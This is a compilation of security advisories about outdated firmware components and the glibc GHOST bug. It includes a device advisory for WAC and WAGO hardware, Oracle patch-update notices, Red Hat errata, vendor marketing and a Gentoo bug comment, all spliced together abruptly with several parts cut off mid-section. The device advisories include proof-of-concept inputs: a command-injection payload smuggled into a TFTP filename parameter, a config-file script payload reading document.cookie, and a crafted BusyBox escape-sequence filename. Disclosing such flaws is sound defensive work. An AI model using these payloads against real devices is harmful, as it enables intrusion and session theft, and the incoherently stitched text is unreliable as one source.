Multiple outdated software components containing vulnerabilities were found by
the IoT Inspector.

The vulnerabilities 1), 2) and 3) were manually verified on an emulated device
by using the MEDUSA scalable firmware runtime.

Proof of concept:
-----------------
1) Authenticated Command Injection (CVE-2021-39279)
The vulnerability can be triggered by navigating in the web interface to the
tab:

"Main Menu"->"Maintenance"->"Config Import Export"

The "TFTP Import" menu is prone to command injection via all parameters. To
exploit the vulnerability, an IP address, a configuration path and a filename
must be set.
If the filename is used to trigger the exploit, the payload in the interceptor
proxy would be:

<http://192.168.1.1/forms/web_importTFTP?servIP=192.168.1.1&configPath=/&fileName=name>|`ping localhost -c 100`

2) Reflected Cross-Site Scripting via Manipulated Config-File (CVE-2021-39278)
The vulnerability can be triggered by navigating in the web interface to the
tab:

"Main Menu"->"Maintenance"->"Config Import Export"

The "Config Import" menu is prone to reflected cross-site scripting via the
upload of config files. Example of malicious config file:
-------------------------------------------------------------------------------
[board]
deviceName="WAC-2004_0000</span><script>alert(document.cookie)</script>"
deviceLocation=""
[..]
-------------------------------------------------------------------------------
Uploading such a crafted file triggers cross-site scripting as the erroneous
value is displayed without filtering characters.

3) Known GNU glibc Vulnerabilities (CVE-2015-0235)
GNU glibc version 2.9 contains multiple CVEs like:
CVE-2016-1234, CVE-2015-7547, CVE-2013-7423, CVE-2013-1914, and more.

The gethostbyname buffer overflow vulnerability (GHOST) was checked with the
help of the exploit code from <https://seclists.org/oss-sec/2015/q1/274>. It was
compiled and executed on the emulated device to test the system.

4) Multiple Outdated Software Components
The IoT Inspector recognized multiple outdated software components with known
vulnerabilities:

BusyBox         1.18.5   06/2011
Dropbear SSH    2011.54  11/2011
GNU glibc       2.9      02/2009
Linux Kernel    2.6.27   10/2008
OpenSSL         0.9.7g   04/2005
Only found in the program "iw_director"
OpenSSL         1.0.0    03/2010

Vulnerable / tested versions:
-----------------------------
The following firmware versions for various devices have been identified
to be vulnerable:
* WAC-2004               / 1.7
* WAC-1001               / 2.1

# Oracle Critical Patch Update Advisory - July 2016

## Oracle Critical Patch Update Advisory - July 2016

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 276 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at <https://blogs.oracle.com/security>.

Please note that the vulnerabilities in this Critical Patch Update are scored using version 3.0 of Common Vulnerability Scoring Standard (CVSS).

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available [here](/security-alerts/cpufaq.html#CVRF).

### Affected Products and Components

Security vulnerabilities addressed by this Critical Patch Update affect the products listed in the categories below. The product area of the patches for the listed versions is shown in the Patch Availability column corresponding to the specified Products and Versions column.

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Users running Java SE with a browser can download the latest release from http://java.com. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates (CPUs) and Solaris Third Party bulletins.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is [here](/security-alerts/cpujul2016verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update July 2016 Availability Document, [My Oracle Support Note 2136219.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2136219.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

#### Notes:

1. Outside In Technology is a suite of software development kits (SDKs). The protocol and CVSS score depend on the software that uses the Outside In Technology code. The CVSS score assumes that the software passes data received over a network directly to Outside In Technology code, but if data is not received over a network the CVSS score may be lower.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 13 new security fixes for Oracle Java SE. 9 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujul2016verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 7 and 8 releases.

## Topic

An updated rhev-hypervisor6 package that fixes multiple security issues is
now available for Red Hat Enterprise Virtualization 3.

Red Hat Product Security has rated this update as having Critical security
impact. Common Vulnerability Scoring System (CVSS) base scores, which give
detailed severity ratings, are available for each vulnerability from the
CVE links in the References section.

## Description

The rhev-hypervisor6 package provides a Red Hat Enterprise Virtualization
Hypervisor ISO disk image. The Red Hat Enterprise Virtualization Hypervisor
is a dedicated Kernel-based Virtual Machine (KVM) hypervisor. It includes
everything necessary to run and manage virtual machines: a subset of the
Red Hat Enterprise Linux operating environment and the Red Hat Enterprise
Virtualization Agent.

Note: Red Hat Enterprise Virtualization Hypervisor is only available for
the Intel 64 and AMD64 architectures with virtualization extensions.

A heap-based buffer overflow was found in glibc's
\_\_nss\_hostname\_digits\_dots() function, which is used by the gethostbyname()
and gethostbyname2() glibc function calls. A remote attacker able to make
an application call either of these functions could use this flaw to
execute arbitrary code with the permissions of the user running the
application. (CVE-2015-0235)

A race condition flaw was found in the way the Linux kernel's KVM subsystem
handled PIT (Programmable Interval Timer) emulation. A guest user who has
access to the PIT I/O ports could use this flaw to crash the host.
(CVE-2014-3611)

A flaw was found in the way OpenSSL handled fragmented handshake packets.
A man-in-the-middle attacker could use this flaw to force a TLS/SSL server
using OpenSSL to use TLS 1.0, even if both the client and the server
supported newer protocol versions. (CVE-2014-3511)

A memory leak flaw was found in the way an OpenSSL handled failed session
ticket integrity checks. A remote attacker could exhaust all available
memory of an SSL/TLS or DTLS server by sending a large number of invalid
session tickets to that server. (CVE-2014-3567)

It was found that the Linux kernel's KVM subsystem did not handle the VM
exits gracefully for the invept (Invalidate Translations Derived from EPT)
and invvpid (Invalidate Translations Based on VPID) instructions. On hosts
with an Intel processor and invept/invppid VM exit support, an unprivileged
guest user could use these instructions to crash the guest. (CVE-2014-3645,
CVE-2014-3646)

Red Hat would like to thank Qualys for reporting the CVE-2015-0235 issue,
Lars Bull of Google for reporting the CVE-2014-3611 issue, and the Advanced
Threat Research team at Intel Security for reporting the CVE-2014-3645 and
CVE-2014-3646 issues.

Users of the Red Hat Enterprise Virtualization Hypervisor are advised to
upgrade to this updated package.

## Solution

This update is available via the Red Hat Network. Details on how to use the
Red Hat Network to apply this update are available at

Once updates have been applied, any process using glibc will need to be restarted. Given that nearly all system processes use glibc, rebooting after upgrading is suggested.

IBM recommends that you review your entire environment to identify vulnerable releases of glibc including your Operating Systems and take appropriate mitigation and remediation actions. Please contact your Operating System provider for more information.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Oracle Critical Patch Update Advisory - October 2016

## Oracle Critical Patch Update Advisory - October 2016

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 253 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at <https://blogs.oracle.com/security>.

Please note that the vulnerabilities in this Critical Patch Update are scored using version 3.0 of Common Vulnerability Scoring Standard (CVSS).

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available [here](/security-alerts/cpufaq.html#CVRF).

### Affected Products and Components

Security vulnerabilities addressed by this Critical Patch Update affect the products listed in the categories below. The product area of the patches for the listed versions is shown in the Patch Availability column corresponding to the specified Affected Products and Versions column. Please click on the link in the Patch Availability column below to access the documentation for patch availability information and installation instructions.

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Users running Java SE with a browser can download the latest release from [http://java.com](http://java.com/). Users on the Windows and Mac OS X platforms can also use automatic updates to get the latest release.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates (CPUs) and Solaris Third Party bulletins.
* Users can download the latest release of Netbeans from [http://netbeans.org](http://netbeans.org/). Users running earlier versions of Netbeans can use automatic updates to get the latest patches.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is [here](/security-alerts/cpuoct2016verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update October 2016 Availability Document, [My Oracle Support Note 2171485.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2171485.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 7 new security fixes for Oracle Java SE. All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpuoct2016verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 8 releases.

| [Description](#c0)  Anton Emmerfors    2002-01-30 06:13:23 UTC  ``` In section 10 (before code listing 18) it would be useful to indicate how to  use a proxy if this is required. Perhaps something along the lines of:  -- If your Internet access is going through a proxy server exporting the  environement variable http_proxy will help. The format is http_proxy=http:// [<user>:<pass>@]<proxyname>:<port>. E.g.  # export http_proxy=<http://john:secret@proxy.name.here:3128> -- ```  [Comment 1](#c1)  Grant Goodyear (RETIRED)   gentoo-dev  2002-02-06 14:35:35 UTC  ``` Proxy info should be set in /etc/make.conf.  I've modifed the standard make.conf, added a note to the build docs, and modified bootstrap.sh so that the proxy values in /etc/make.conf actually get used for the bootstrap.  At the moment the only visible change will be bootstrap.sh.  The site needs to be updated  for the doc change to be seen, and /etc/make.conf will be updated with the next version of portage. ```  [Comment 2](#c2)  John Davis (zhen) (RETIRED)   gentoo-dev  2002-12-15 21:05:40 UTC  ``` Trying to clean out the docs-depricated so that I can close the catergory ... ``` |  |

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2015%3A0090)

## Topic

Updated glibc packages that fix one security issue are now available for
Red Hat Enterprise Linux 5.

Red Hat Product Security has rated this update as having Critical security
impact. A Common Vulnerability Scoring System (CVSS) base score, which
gives a detailed severity rating, is available from the CVE link in the
References section.

## Description

The glibc packages provide the standard C libraries (libc), POSIX thread
libraries (libpthread), standard math libraries (libm), and the Name
Server Caching Daemon (nscd) used by multiple programs on the system.
Without these libraries, the Linux system cannot function correctly.

A heap-based buffer overflow was found in glibc's
\_\_nss\_hostname\_digits\_dots() function, which is used by the gethostbyname()
and gethostbyname2() glibc function calls. A remote attacker able to make
an application call either of these functions could use this flaw to
execute arbitrary code with the permissions of the user running the
application. (CVE-2015-0235)

Red Hat would like to thank Qualys for reporting this issue.

All glibc users are advised to upgrade to these updated packages, which
contain a backported patch to correct this issue.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to use the
Red Hat Network to apply this update are available at

# Oracle Critical Patch Update Advisory - October 2017

## Oracle Critical Patch Update Advisory - October 2017

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 252 new security fixes across the product families listed below. Please note that a MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [October 2017 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=187793594395974id=2310031.1).

Please note that on September 22, 2017, Oracle released [Security Alert for CVE-2017-9805](/security-alerts/alert-cve-2017-9805.html). Customers of affected Oracle product(s) are strongly advised to apply the fixes that were announced in this Security Alert as well as those contained in this Critical Patch update

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available [here](/security-alerts/cpufaq.html#CVRF).

### Affected Products and Components

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=187476629848401id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Users running Java SE with a browser can download the latest release from <http://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=187417703460164id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates (CPUs) and Solaris Third Party bulletins.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuoct2017verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update October 2017 Availability Document, [My Oracle Support Note 2296870.1](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=188252365614599id=2296870.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=187589508421666id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 22 new security fixes for Oracle Java SE. 20 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](https:///security-alerts/cpuoct2017verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 8 releases.

#### Notes:

1. This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator).
2. Applies to the Java SE Kerberos client.
3. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service.

Source: <http://www.wago.us/wago/>

Business recommendation:
------------------------
SEC Consult recommends to immediately apply the available patches
from the vendor. A thorough security review should be performed by
security professionals to identify further potential security issues.

Vulnerability overview/description:
-----------------------------------
The industrial managed switch series 852 from WAGO is affected by multiple
vulnerabilities such as old software components embedded in the firmware.
Furthermore, hardcoded password hashes and credentials were also found by doing
an automated scan with IoT Inspector. Two vulnerabilities (CVE-2017-16544 and
CVE-2015-0235) were verified by emulating the device with the MEDUSA scaleable
firmware runtime. The validity of the password hashes and the embedded keys were
also verified by emulating the device.

1) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.12.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.8 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-0235, "GHOST") was verified by
using the MEDUSA scaleable firmware runtime.

3) Hardcoded Credentials (CVE-2019-12550)
The device contains hardcoded users and passwords which can be used to login
via SSH and Telnet.

4) Embedded Private Keys (CVE-2019-12549)
The device contains hardcoded private keys for the SSH daemon. The fingerprint
of the SSH host key from the corresponding SSH daemon matches to the embedded
private key.

Proof of concept:
-----------------
1) Known BusyBox Vulnerabilities
BusyBox version 1.12.0 contains multiple CVEs like:
CVE-2013-1813, CVE-2016-2148, CVE-2016-6301, CVE-2011-2716, CVE-2011-5325,
CVE-2015-9261, CVE-2016-2147 and more.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device. A file with the name "\ectest\n\e]55;test.txt\a" was created
to trigger the vulnerability.

-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.8 contains multiple CVEs like:
